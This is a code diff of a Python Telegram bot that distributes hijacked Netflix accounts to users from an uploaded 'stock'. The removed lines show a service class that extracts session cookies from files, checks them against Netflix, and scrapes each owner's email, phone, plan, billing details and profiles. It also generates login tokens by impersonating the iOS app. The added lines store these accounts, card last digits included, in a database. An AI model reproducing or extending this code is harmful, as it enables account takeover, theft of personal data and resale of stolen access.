             ''', (user_id, account.id))
-            
             if cur.rowcount > 0:
                 self.db.commit_sqlite()
                 user_repo = UserRepository(self.db)
                 user_repo.update_cooldown(user_id)
                 return account
-            
             self.db.commit_sqlite()
             return None
         except Exception as e:
@@ -794,12 +1157,11 @@ class AccountRepository:
             return None
     
     def get_assigned(self, user_id: int) -> Optional[Account]:
-        """Get user's assigned account."""
         try:
             cur = self.db.execute_sqlite('''
-                SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry,
+                SELECT id, email, country, plan, plan_key, cookies, nftoken, nftoken_expiry,
                        account_name, streams, quality, price, billing_date, profiles,
-                       user_guid, phone, extra_member, membership_status
+                       user_guid, phone, extra_member, membership_status, on_hold
                 FROM accounts 
                 WHERE assigned_to = ? AND status = 'assigned' 
                 ORDER BY assigned_at DESC LIMIT 1
@@ -807,30 +1169,19 @@ class AccountRepository:
             row = cur.fetchone()
             if row:
                 return Account(
-                    id=row[0],
-                    email=safe_str(row[1]),
-                    country=safe_str(row[2]),
-                    plan=safe_str(row[3]),
-                    cookies=safe_str(row[4]),
-                    nftoken=safe_str(row[5]),
-                    nftoken_expiry=safe_str(row[6]),
-                    account_name=safe_str(row[7]),
-                    streams=safe_int(row[8]),
-                    quality=safe_str(row[9]),
-                    price=safe_str(row[10]),
-                    billing_date=safe_str(row[11]),
-                    profiles=safe_str(row[12]),
-                    user_guid=safe_str(row[13]),
-                    phone=safe_str(row[14]),
-                    extra_member=safe_bool(row[15]),
-                    membership_status=safe_str(row[16])
+                    id=row[0], email=safe_str(row[1]), country=safe_str(row[2]), plan=safe_str(row[3]),
+                    plan_key=safe_str(row[4]), cookies=safe_str(row[5]), nftoken=safe_str(row[6]),
+                    nftoken_expiry=safe_str(row[7]), account_name=safe_str(row[8]),
+                    streams=safe_int(row[9]), quality=safe_str(row[10]), price=safe_str(row[11]),
+                    billing_date=safe_str(row[12]), profiles=safe_str(row[13]),
+                    user_guid=safe_str(row[14]), phone=safe_str(row[15]), extra_member=safe_bool(row[16]),
+                    membership_status=safe_str(row[17]), on_hold=safe_bool(row[18])
                 )
         except Exception as e:
             logger.error(f"AccountRepository.get_assigned error: {e}")
         return None
     
     def release(self, account_id: int) -> bool:
-        """Release account back to pool."""
         try:
             self.db.execute_sqlite('''
                 UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = 'available' 
@@ -843,7 +1194,6 @@ class AccountRepository:
             return False
     
     def delete(self, account_id: int) -> bool:
-        """Delete account."""
         try:
             self.db.execute_sqlite('DELETE FROM accounts WHERE id = ?', (account_id,))
             self.db.commit_sqlite()
@@ -853,10 +1203,9 @@ class AccountRepository:
             return False
     
     def clear_all(self, plan_filter: Optional[str] = None) -> int:
-        """Clear all accounts."""
         try:
             if plan_filter:
-                cur = self.db.execute_sqlite('DELETE FROM accounts WHERE UPPER(plan) = UPPER(?)', (plan_filter,))
+                cur = self.db.execute_sqlite('DELETE FROM accounts WHERE plan_key = ?', (plan_filter,))
             else:
                 cur = self.db.execute_sqlite('DELETE FROM accounts')
             self.db.commit_sqlite()
@@ -865,76 +1214,68 @@ class AccountRepository:
             logger.error(f"AccountRepository.clear_all error: {e}")
             return 0
     
+    def save_account(self, account_data: Dict) -> bool:
+        try:
+            email = account_data.get("email")
+            if email and self.duplicate_tracker.is_duplicate(email):
+                logger.info(f"⏭️ Skipping duplicate: {email}")
+                return False
+            
+            self.db.execute_sqlite('''
+                INSERT INTO accounts (
+                    email, country, plan, plan_key, cookies, nftoken, nftoken_expiry,
+                    source_file, last_checked, account_name, streams, quality,
+                    price, billing_date, member_since, payment_method, card_last4,
+                    phone, extra_member, membership_status, email_verified,
+                    profiles, user_guid, working_confirmed, status, is_working, on_hold
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 'available', 1, ?)
+            ''', (
+                safe_str(account_data.get("email")),
+                safe_str(account_data.get("country")),
+                safe_str(account_data.get("plan_label", account_data.get("plan", "Unknown"))),
+                safe_str(account_data.get("plan_key", "unknown")),
+                safe_str(account_data.get("cookies")),
+                safe_str(account_data.get("nftoken")),
+                safe_str(account_data.get("nftoken_expiry")),
+                safe_str(account_data.get("source_file", "unknown")),
+                get_timestamp(),
+                safe_str(account_data.get("account_name")),
+                safe_int(account_data.get("streams")),
+                safe_str(account_data.get("quality")),
+                safe_str(account_data.get("price")),
+                safe_str(account_data.get("billing_date")),
+                safe_str(account_data.get("member_since")),
+                safe_str(account_data.get("payment_method")),
+                safe_str(account_data.get("card_last4")),
+                safe_str(account_data.get("phone")),
+                1 if safe_bool(account_data.get("extra_member")) else 0,
+                safe_str(account_data.get("membership_status")),
+                1 if safe_bool(account_data.get("email_verified")) else 0,
+                safe_str(account_data.get("profiles")),
+                safe_str(account_data.get("user_guid")),
+                1 if safe_bool(account_data.get("on_hold")) else 0,
+            ))
+            self.db.commit_sqlite()
+            return True
+        except Exception as e:
+            logger.error(f"AccountRepository.save_account error: {e}")
+            return False
+    
     def save_batch(self, accounts: List[Dict]) -> int:
-        """Save multiple accounts."""
         if not accounts:
             return 0
-        
         saved = 0
-        try:
-            before_cur = self.db.execute_sqlite('SELECT COUNT(*) FROM accounts')
-            before = before_cur.fetchone()[0] or 0
-            logger.info(f"📊 Before insert: {before} accounts")
-            
-            for a in accounts:
-                try:
-                    self.db.execute_sqlite('''
-                        INSERT INTO accounts (
-                            email, country, plan, cookies, nftoken, nftoken_expiry,
-                            source_file, last_checked, account_name, streams, quality,
-                            price, billing_date, member_since, payment_method, card_last4,
-                            phone, extra_member, membership_status, email_verified,
-                            profiles, user_guid, working_confirmed, status, is_working
-                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 'available', 1)
-                    ''', (
-                        safe_str(a.get("email")),
-                        safe_str(a.get("country")),
-                        safe_str(a.get("plan")),
-                        safe_str(a.get("cookies")),
-                        safe_str(a.get("nftoken")),
-                        safe_str(a.get("nftoken_expiry")),
-                        safe_str(a.get("source_file")),
-                        get_timestamp(),
-                        safe_str(a.get("account_name")),
-                        safe_int(a.get("streams")),
-                        safe_str(a.get("quality")),
-                        safe_str(a.get("price")),
-                        safe_str(a.get("billing_date")),
-                        safe_str(a.get("member_since")),
-                        safe_str(a.get("payment_method")),
-                        safe_str(a.get("card_last4")),
-                        safe_str(a.get("phone")),
-                        1 if safe_bool(a.get("extra_member")) else 0,
-                        safe_str(a.get("membership_status")),
-                        1 if safe_bool(a.get("email_verified")) else 0,
-                        safe_str(a.get("profiles")),
-                        safe_str(a.get("user_guid")),
-                    ))
-                    saved += 1
-                except Exception as e:
-                    logger.error(f"Failed to save account: {e}")
-                    continue
-            
-            self.db.commit_sqlite()
-            
-            after_cur = self.db.execute_sqlite('SELECT COUNT(*) FROM accounts')
-            after = after_cur.fetchone()[0] or 0
-            logger.info(f"📊 After insert: {after} accounts")
-            logger.info(f"✅ Saved: {saved} accounts")
-            
-            return saved
-        except Exception as e:
-            logger.error(f"AccountRepository.save_batch error: {e}")
-            return 0
+        for account in accounts:
+            if self.save_account(account):
+                saved += 1
+        logger.info(f"✅ Saved {saved}/{len(accounts)} accounts")
+        return saved
 
 class ReportRepository:
-    """Repository for report operations."""
-    
     def __init__(self, db: DatabaseManager):
         self.db = db
     
     def create(self, user_id: int, account_id: int, report_type: str, screenshot_file_id: str) -> int:
-        """Create a new report."""
         try:
             cur = self.db.execute_turso('''
                 INSERT INTO reports (user_id, account_id, report_type, screenshot_file_id)
@@ -953,14 +1294,12 @@ class ReportRepository:
                 WHERE user_id = ?
             ''', (user_id,))
             self.db.commit_turso()
-            
             return report_id
         except Exception as e:
             logger.error(f"ReportRepository.create error: {e}")
             return 0
     
     def get_pending(self) -> List[Dict]:
-        """Get pending reports."""
         try:
             cur = self.db.execute_turso('''
                 SELECT r.id, r.user_id, r.account_id, r.report_type, 
@@ -974,14 +1313,9 @@ class ReportRepository:
             rows = cur.fetchall()
             return [
                 {
-                    "id": r[0],
-                    "user_id": r[1],
-                    "account_id": r[2],
-                    "report_type": safe_str(r[3]),
-                    "screenshot": safe_str(r[4]),
-                    "time": safe_str(r[5]),
-                    "username": safe_str(r[6]),
-                    "email": safe_str(r[7])
+                    "id": r[0], "user_id": r[1], "account_id": r[2],
+                    "report_type": safe_str(r[3]), "screenshot": safe_str(r[4]),
+                    "time": safe_str(r[5]), "username": safe_str(r[6]), "email": safe_str(r[7])
                 }
                 for r in rows
             ]
@@ -990,7 +1324,6 @@ class ReportRepository:
             return []
     
     def update_status(self, report_id: int, status: str, admin_id: int) -> bool:
-        """Update report status."""
         try:
             self.db.execute_turso('''
                 UPDATE reports SET status = ?, reviewed_at = CURRENT_TIMESTAMP, admin_id = ? 
@@ -1002,8 +1335,7 @@ class ReportRepository:
             logger.error(f"ReportRepository.update_status error: {e}")
             return False
     
-    def get_by_id(self, report_id: int) -> Optional[Report]:
-        """Get report by ID."""
+    def get_by_id(self, report_id: int) -> Optional[Dict]:
         try:
             cur = self.db.execute_turso('''
                 SELECT id, user_id, account_id, report_type, screenshot_file_id,
@@ -1012,30 +1344,21 @@ class ReportRepository:
             ''', (report_id,))
             row = cur.fetchone()
             if row:
-                return Report(
-                    id=row[0],
-                    user_id=row[1],
-                    account_id=row[2],
-                    report_type=row[3],
-                    screenshot_file_id=row[4],
-                    status=row[5],
-                    reported_at=row[6],
-                    reviewed_at=row[7],
-                    admin_id=row[8],
-                    channel_post_id=row[9]
-                )
+                return {
+                    "id": row[0], "user_id": row[1], "account_id": row[2],
+                    "report_type": row[3], "screenshot_file_id": row[4],
+                    "status": row[5], "reported_at": row[6], "reviewed_at": row[7],
+                    "admin_id": row[8], "channel_post_id": row[9]
+                }
         except Exception as e:
             logger.error(f"ReportRepository.get_by_id error: {e}")
         return None
 
 class ChannelRepository:
-    """Repository for channel operations."""
-    
     def __init__(self, db: DatabaseManager):
         self.db = db
     
     def get_active(self) -> List[Tuple]:
-        """Get active channels."""
         try:
             cur = self.db.execute_turso('SELECT channel_id, channel_name, invite_link FROM channels WHERE is_active = 1')
             return cur.fetchall()
@@ -1044,7 +1367,6 @@ class ChannelRepository:
             return []
     
     def add(self, channel_id: str, channel_name: str, invite_link: str) -> bool:
-        """Add a channel."""
         try:
             self.db.execute_turso('''
                 INSERT OR REPLACE INTO channels (channel_id, channel_name, invite_link) 
@@ -1057,7 +1379,6 @@ class ChannelRepository:
             return False
     
     def remove(self, channel_id: int) -> bool:
-        """Remove a channel."""
         try:
             self.db.execute_turso('DELETE FROM channels WHERE id = ?', (channel_id,))
             self.db.commit_turso()
@@ -1067,13 +1388,10 @@ class ChannelRepository:
             return False
 
 class StatsRepository:
-    """Repository for statistics operations."""
-    
     def __init__(self, db: DatabaseManager):
         self.db = db
     
     def log_stock(self, admin_id: int, file_name: str, total: int, valid: int) -> bool:
-        """Log stock upload."""
         try:
             self.db.execute_turso('''
                 INSERT INTO stock_logs (admin_id, file_name, total_found, valid_found) 
@@ -1086,7 +1404,6 @@ class StatsRepository:
             return False
     
     def get_stock_logs(self, limit: int = 20) -> List[Dict]:
-        """Get stock upload history."""
         try:
             cur = self.db.execute_turso('''
                 SELECT id, admin_id, file_name, total_found, valid_found, uploaded_at 
@@ -1095,12 +1412,8 @@ class StatsRepository:
             rows = cur.fetchall()
             return [
                 {
-                    "id": r[0],
-                    "admin_id": r[1],
-                    "file_name": safe_str(r[2]),
-                    "total": safe_int(r[3]),
-                    "valid": safe_int(r[4]),
-                    "time": safe_str(r[5])
+                    "id": r[0], "admin_id": r[1], "file_name": safe_str(r[2]),
+                    "total": safe_int(r[3]), "valid": safe_int(r[4]), "time": safe_str(r[5])
                 }
                 for r in rows
             ]
@@ -1109,7 +1422,6 @@ class StatsRepository:
             return []
     
     def log_daily(self, hits: int = 0, free: int = 0, bad: int = 0) -> bool:
-        """Update daily stats."""
         try:
             cur = self.db.execute_turso('SELECT id FROM stats WHERE date = CURRENT_DATE')
             row = cur.fetchone()
@@ -1131,7 +1443,6 @@ class StatsRepository:
             return False
     
     def get_today(self) -> Dict[str, int]:
-        """Get today's stats."""
         try:
             cur = self.db.execute_turso('SELECT total_hits, total_free, total_bad FROM stats WHERE date = CURRENT_DATE')
             row = cur.fetchone()
@@ -1142,362 +1453,19 @@ class StatsRepository:
         return {"hits": 0, "free": 0, "bad": 0}
 
 # ============================================================
-# SERVICE LAYER
-# ============================================================
-class NetflixService:
-    """Service for Netflix account operations."""
-    
-    NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
-    
-    @staticmethod
-    def extract_cookie_pairs(content: str) -> List[Tuple[str, Optional[str]]]:
-        """Extract Netflix cookie pairs from content."""
-        pairs = []
-        seen = set()
-        
-        # JSON format
-        try:
-            data = json.loads(content)
-            if isinstance(data, dict) and "cookies" in data:
-                cookies = data.get("cookies", [])
-                nid = None
-                sid = None
-                for cookie in cookies:
-                    if cookie.get("name") == "NetflixId":
-                        nid = safe_str(cookie.get("value"))
-                    elif cookie.get("name") == "SecureNetflixId":
-                        sid = safe_str(cookie.get("value"))
-                if nid and nid not in seen:
-                    seen.add(nid)
-                    pairs.append((nid, sid))
-        except Exception:
-            pass
-        
-        # Netscape format
-        if not pairs:
-            for line in content.splitlines():
-                line = line.strip()
-                if not line or line.startswith('#'):
-                    continue
-                parts = line.split('\t')
-                if len(parts) >= 7 and parts[5] == "NetflixId":
-                    nid = parts[6].strip()
-                    if nid and nid not in seen:
-                        seen.add(nid)
-                        pairs.append((nid, None))
-        
-        # Regex fallback
-        if not pairs:
-            netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
-            secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
-            netflix_matches = netflix_pattern.findall(content)
-            secure_matches = secure_pattern.findall(content)
-            for i, nid in enumerate(netflix_matches):
-                nid = nid.strip('"\'')
-                sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
-                if nid and nid not in seen:
-                    seen.add(nid)
-                    pairs.append((nid, sid))
-        
-        return pairs
-    
-    @staticmethod
-    def get_cookie_text(netflix_id: str, secure_id: Optional[str] = None) -> str:
-        """Get cookie text from IDs."""
-        lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + safe_str(netflix_id)]
-        if secure_id:
-            lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + safe_str(secure_id))
-        return "\n".join(lines)
-    
-    @staticmethod
-    def generate_nftoken(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
-        """Generate NFToken for Netflix ID."""
-        if not netflix_id:
-            return None, None
-        
-        query_params = {
-            "appVersion": "15.48.1",
-            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
-            "device_type": "NFAPPL-02-",
-            "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-            "idiom": "phone",
-            "iosVersion": "15.8.5",
-            "isTablet": "false",
-            "languages": "en-US",
-            "locale": "en-US",
-            "maxDeviceWidth": "375",
-            "model": "saget",
-            "modelType": "IPHONE8-1",
-            "odpAware": "true",
-            "path": '["account","token","default"]',
-            "pathFormat": "graph",
-            "pixelDensity": "2.0",
-            "progressive": "false",
-            "responseFormat": "json",
-        }
-        
-        headers = {
-            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
-            "x-netflix.request.attempt": "1",
-            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
-            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
-            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
-            "x-netflix.context.app-version": "15.48.1",
-            "x-netflix.argo.translated": "true",
-            "x-netflix.context.form-factor": "phone",
-            "x-netflix.context.sdk-version": "2012.4",
-            "x-netflix.client.appversion": "15.48.1",
-            "x-netflix.context.max-device-width": "375",
-            "x-netflix.context.ab-tests": "",
-            "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
-            "x-netflix.client.type": "argo",
-            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-            "x-netflix.context.locales": "en-US",
-            "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
-            "x-netflix.client.iosversion": "15.8.5",
-            "accept-language": "en-US;q=1",
-            "x-netflix.argo.abtests": "",
-            "x-netflix.context.os-version": "15.8.5",
-            "x-netflix.request.client.context": '{"appState":"foreground"}',
-            "x-netflix.context.ui-flavor": "argo",
-            "x-netflix.argo.nfnsm": "9",
-            "x-netflix.context.pixel-density": "2.0",
-            "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
-            "x-netflix.request.client.timezoneid": "Asia/Dhaka",
-        }
-        
-        for attempt in range(attempts):
-            try:
-                headers_copy = dict(headers)
-                headers_copy["Cookie"] = f"NetflixId={netflix_id}"
-                headers_copy["x-netflix.request.attempt"] = str(attempt + 1)
-                
-                response = requests.get(
-                    NetflixService.NFTOKEN_API_URL,
-                    params=query_params,
-                    headers=headers_copy,
-                    timeout=30,
-                    verify=False
-                )
-                
-                if response.status_code == 200:
-                    data = response.json()
-                    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
-                    token = token_data.get("token")
-                    expires = token_data.get("expires")
-                    if token:
-                        return token, expires
-                time.sleep(0.5)
-            except Exception:
-                time.sleep(0.5)
-        
-        return None, None
-    
-    @staticmethod
-    def check_account(cookies_dict: Dict) -> Dict:
-        """Check if Netflix account is valid and subscribed."""
-        if not cookies_dict or "NetflixId" not in cookies_dict:
-            return {"valid": False, "error": "Missing NetflixId"}
-        
-        try:
-            session = requests.Session()
-            for name, value in cookies_dict.items():
-                session.cookies.set(name, value, domain=".netflix.com")
-            
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Accept-Encoding": "identity",
-                "Cache-Control": "no-cache",
-                "Pragma": "no-cache",
-            }
-            
-            for attempt in range(MAX_RETRIES):
-                try:
-                    response = session.get(
-                        "https://www.netflix.com/account/membership",
-                        headers=headers,
-                        timeout=CHECK_TIMEOUT,
-                        verify=False,
-                        allow_redirects=True
-                    )
-                    
-                    if response.status_code != 200:
-                        if attempt < MAX_RETRIES - 1:
-                            time.sleep(0.5)
-                            continue
-                        return {"valid": False, "error": f"HTTP {response.status_code}"}
-                    
-                    if "login" in response.url.lower() or "signin" in response.url.lower():
-                        return {"valid": False, "error": "Redirected to login"}
-                    
-                    text = response.text
-                    
-                    # Check Household Lock
-                    if any(x in text.lower() for x in ["update-primary-location", "household", "not part of the netflix household"]):
-                        membership_status = "Household Locked"
-                    else:
-                        membership_status = "Active"
-                    
-                    # Extract email
-                    email = None
-                    for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']:
-                        match = re.search(pattern, text, re.IGNORECASE)
-                        if match:
-                            email = match.group(1).strip()
-                            break
-                    if not email:
-                        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
-                        if match:
-                            email = match.group(1).strip()
-                    
-                    # Extract name
-                    name = None
-                    for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
-                        match = re.search(pattern, text, re.IGNORECASE)
-                        if match:
-                            name = match.group(1).strip()
-                            break
-                    
-                    # Extract country
-                    country = None
-                    for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
-                        match = re.search(pattern, text, re.IGNORECASE)
-                        if match:
-                            country = match.group(1).strip()
-                            break
-                    
-                    # Extract plan
-                    plan = None
-                    for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
-                        match = re.search(pattern, text, re.IGNORECASE)
-                        if match:
-                            plan = match.group(1).strip()
-                            break
-                    
-                    plan_key = "FREE"
-                    plan_label = "Free"
-                    if plan:
-                        plan_lower = plan.lower()
-                        if any(x in plan_lower for x in ["premium", "高級", "高级"]):
-                            plan_key, plan_label = "PREMIUM", "Premium"
-                        elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
-                            plan_key, plan_label = "STANDARD", "Standard"
-                        elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
-                            plan_key, plan_label = "BASIC", "Basic"
-                        elif any(x in plan_lower for x in ["mobile", "ponsel", "movil"]):
-                            plan_key, plan_label = "MOBILE", "Mobile"
-                    
-                    streams = 1
-                    match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
-                    if match:
-                        streams = int(match.group(1))
-                    elif plan_key == "PREMIUM":
-                        streams = 4
-                    elif plan_key == "STANDARD":
-                        streams = 2
-                    
-                    quality = "HD"
-                    if plan_key == "PREMIUM":
-                        quality = "Ultra HD 4K"
-                    elif plan_key == "STANDARD":
-                        quality = "Full HD"
-                    
-                    # Extract price
-                    price = None
-                    for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
-                        match = re.search(pattern, text, re.IGNORECASE)
-                        if match:
-                            price = match.group(1).strip()
-                            break
-                    
-                    # Extract billing
-                    billing = None
-                    match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
-                    if match:
-                        billing = match.group(1).strip()
-                    
-                    # Extract phone
-                    phone = None
-                    match = re.search(r'"phoneNumberDigits"[^}]*"value"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
-                    if match:
-                        phone = match.group(1).strip()
-                    
-                    # Extract profiles
-                    profiles = []
-                    for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
-                        if match.group(1) not in profiles:
-                            profiles.append(match.group(1))
-                    profiles_str = ", ".join(profiles) if profiles else None
-                    
-                    # Extract user_guid
-                    user_guid = None
-                    for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
-                        match = re.search(pattern, text, re.IGNORECASE)
-                        if match:
-                            user_guid = match.group(1).strip()
-                            break
-                    
-                    is_subscribed = plan_key != "FREE"
-                    
-                    # Generate NFToken
-                    nftoken = None
-                    nftoken_expiry = None
-                    if cookies_dict.get("NetflixId"):
-                        nftoken, nftoken_expiry = NetflixService.generate_nftoken(cookies_dict.get("NetflixId"))
-                    
-                    # Log stats
-                    stats_repo = StatsRepository(db)
-                    stats_repo.log_daily(hits=1 if is_subscribed else 0, free=1 if not is_subscribed else 0, bad=0)
-                    
-                    return {
-                        "valid": True,
-                        "subscribed": is_subscribed,
-                        "email": email,
-                        "name": name,
-                        "country": country,
-                        "plan": plan or plan_label,
-                        "plan_key": plan_key,
-                        "plan_label": plan_label,
-                        "streams": streams,
-                        "quality": quality,
-                        "price": price,
-                        "billing_date": billing,
-                        "membership_status": membership_status,
-                        "phone": phone,
-                        "profiles": profiles_str,
-                        "user_guid": user_guid,
-                        "nftoken": nftoken,
-                        "nftoken_expiry": nftoken_expiry,
-                    }
-                except Exception as e:
-                    logger.debug(f"Check attempt {attempt+1} failed: {e}")
-                    if attempt < MAX_RETRIES - 1:
-                        continue
-                    return {"valid": False, "error": "Error during check"}
-            
-            return {"valid": False, "error": "Max retries exceeded"}
-        except Exception as e:
-            logger.error(f"check_account error: {e}")
-            return {"valid": False, "error": "Exception"}
-
-# ============================================================
 # BOT HANDLERS
 # ============================================================
 class BotHandlers:
-    """Centralized bot handlers with clean error handling."""
-    
     def __init__(self):
-        self.db = DatabaseManager()
+        self.db = db
+        self.duplicate_tracker = DuplicateTracker()
         self.user_repo = UserRepository(self.db)
-        self.account_repo = AccountRepository(self.db)
+        self.account_repo = AccountRepository(self.db, self.duplicate_tracker)
         self.report_repo = ReportRepository(self.db)
         self.channel_repo = ChannelRepository(self.db)
         self.stats_repo = StatsRepository(self.db)
     
     async def _send_message(self, update: Update, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
-        """Send or edit message based on context."""
         try:
             if update.callback_query:
                 query = update.callback_query
@@ -1519,12 +1487,10 @@ class BotHandlers:
         return None
     
     async def _check_force_sub(self, bot, user_id: int):
-        """Check if user has joined required channels."""
         try:
             channels = self.channel_repo.get_active()
             if not channels:
                 return True, []
-            
             missing_buttons = []
             for ch_id, ch_name, ch_link in channels:
                 try:
@@ -1533,7 +1499,6 @@ class BotHandlers:
                         missing_buttons.append(InlineKeyboardButton(f"📢 Join {ch_name}", url=ch_link))
                 except Exception:
                     pass
-            
             if missing_buttons:
                 return False, missing_buttons
             return True, []
@@ -1541,10 +1506,8 @@ class BotHandlers:
             return True, []
     
     def _can_get_account(self, user: User) -> Tuple[bool, str]:
-        """Check if user can get an account."""
         if user.is_banned:
             return False, "🚫 You are banned from using this bot."
-        
         if user.last_account_time:
             try:
                 time_str = str(user.last_account_time).split('.')[0].replace('T', ' ')
@@ -1556,10 +1519,8 @@ class BotHandlers:
                     return False, f"⏳ Cooldown active! Please wait {remaining} minute(s)."
             except Exception:
                 pass
-        
         if user.accounts_used >= MAX_ACCOUNTS_PER_USER and not is_admin(user.user_id):
             return False, f"⚠️ Account limit reached! Max {MAX_ACCOUNTS_PER_USER} accounts."
-        
         return True, ""
     
     # ============================================================
@@ -1567,11 +1528,9 @@ class BotHandlers:
     # ============================================================
     
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /start command."""
         try:
             user = update.effective_user
             user_id = user.id
-            
             self.user_repo.create_or_update(user_id, user.username, user.first_name)
             user_data = self.user_repo.get(user_id)
             
@@ -1600,7 +1559,7 @@ class BotHandlers:
             stats = self.account_repo.get_total()
             plan_display = ""
             for plan, count in stats.get('plans', {}).items():
-                emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱"}.get(plan.upper(), "📦")
+                emoji = {"premium": "👑", "standard": "⭐", "basic": "🎯", "mobile": "📱", "free": "🆓"}.get(plan.lower(), "📦")
                 plan_display += f"│ {emoji} {html_escape(plan)}: <b>{count}</b>\n"
             if not plan_display:
                 plan_display = "│ No accounts available\n"
@@ -1610,18 +1569,15 @@ class BotHandlers:
             keyboard = [
                 [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
             ]
-            
             if assigned:
                 keyboard.append([
                     InlineKeyboardButton("✅ Working", callback_data="working"),
                     InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
                 ])
-            
             keyboard.append([
                 InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
                 InlineKeyboardButton("📊 My Status", callback_data="my_status"),
             ])
-            
             if is_admin(user_id):
                 keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
             
@@ -1651,11 +1607,9 @@ class BotHandlers:
             await self._send_message(update, "❌ An error occurred. Please try again later.")
     
     async def get_account_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle get account button."""
         try:
             user_id = update.effective_user.id
             user = self.user_repo.get(user_id)
-            
             if user.is_banned:
                 await self._send_message(update, "🚫 You are banned from using this bot.")
                 return
@@ -1753,22 +1707,18 @@ class BotHandlers:
             await self._send_message(update, "❌ Error getting account. Please try again.")
     
     async def working_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle working report button."""
         try:
             user_id = update.effective_user.id
             user = self.user_repo.get(user_id)
-            
             if user.is_banned:
                 await self._send_message(update, "🚫 You are banned from using this bot.")
                 return
-            
             if user.pending_report:
                 await self._send_message(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
                 return
             
             data = update.callback_query.data if update.callback_query else ""
             account_id = None
-            
             if data.startswith("report_working_"):
                 account_id = int(data.split("_")[2])
             else:
@@ -1799,22 +1749,18 @@ class BotHandlers:
             await self._send_message(update, "❌ Error starting report. Please try again.")
     
     async def notworking_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle not working report button."""
         try:
             user_id = update.effective_user.id
             user = self.user_repo.get(user_id)
-            
             if user.is_banned:
                 await self._send_message(update, "🚫 You are banned from using this bot.")
                 return
-            
             if user.pending_report:
